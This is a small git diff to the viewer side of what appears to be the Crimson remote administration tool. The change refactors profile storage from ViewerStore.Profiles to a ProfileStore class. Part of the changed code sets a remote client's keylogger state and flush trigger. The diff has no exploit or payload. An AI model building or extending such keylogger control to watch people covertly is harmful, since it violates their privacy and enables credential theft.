@@ -70,7 +70,7 @@ import com.subterranean_security.crimson.core.util.IDGen;
 import com.subterranean_security.crimson.sv.permissions.ViewerPermissions;
 import com.subterranean_security.crimson.sv.profile.ClientProfile;
 import com.subterranean_security.crimson.universal.Universal;
-import com.subterranean_security.crimson.viewer.ViewerStore;
+import com.subterranean_security.crimson.viewer.store.ProfileStore;
 import com.subterranean_security.crimson.viewer.ui.screen.generator.Report;
 import com.subterranean_security.crimson.viewer.ui.screen.main.MainFrame;
 
@@ -115,8 +115,8 @@ public enum ViewerCommands {
 						MainFrame.main = new MainFrame();
 					}
 
-					ViewerStore.Profiles.update(lrs.getRsLogin().getSpd());
-					ViewerStore.Profiles.update(lrs.getRsLogin().getVpd());
+					ProfileStore.update(lrs.getRsLogin().getSpd());
+					ProfileStore.update(lrs.getRsLogin().getVpd());
 					triggerProfileDelta();
 					return true;
 				}
@@ -136,8 +136,8 @@ public enum ViewerCommands {
 
 		// report last update timestamps for current clients
 		MI_TriggerProfileDelta.Builder mi = MI_TriggerProfileDelta.newBuilder();
-		for (int i = 0; i < ViewerStore.Profiles.clients.size(); i++) {
-			ClientProfile cp = ViewerStore.Profiles.clients.get(i);
+		for (int i = 0; i < ProfileStore.clients.size(); i++) {
+			ClientProfile cp = ProfileStore.clients.get(i);
 
 			mi.addProfileTimestamp(
 					ProfileTimestamp.newBuilder().setCvid(cp.getCid()).setTimestamp(cp.getLastUpdate().getTime()));
@@ -576,13 +576,13 @@ public enum ViewerCommands {
 				if (m.getRsChangeSetting().getResult().getResult()) {
 					// update profile
 					if (rq.hasKeyloggerState()) {
-						ViewerStore.Profiles.getClient(cid).setKeyloggerState(rq.getKeyloggerState());
+						ProfileStore.getClient(cid).setKeyloggerState(rq.getKeyloggerState());
 					}
 					if (rq.hasFlushMethod()) {
-						ViewerStore.Profiles.getClient(cid).setKeyloggerTrigger(rq.getFlushMethod());
+						ProfileStore.getClient(cid).setKeyloggerTrigger(rq.getFlushMethod());
 					}
 					if (rq.hasFlushValue()) {
-						ViewerStore.Profiles.getClient(cid).setKeyloggerTriggerValue(rq.getFlushValue());
+						ProfileStore.getClient(cid).setKeyloggerTriggerValue(rq.getFlushValue());
 					}
 				}
 				return m.getRsChangeSetting().getResult();
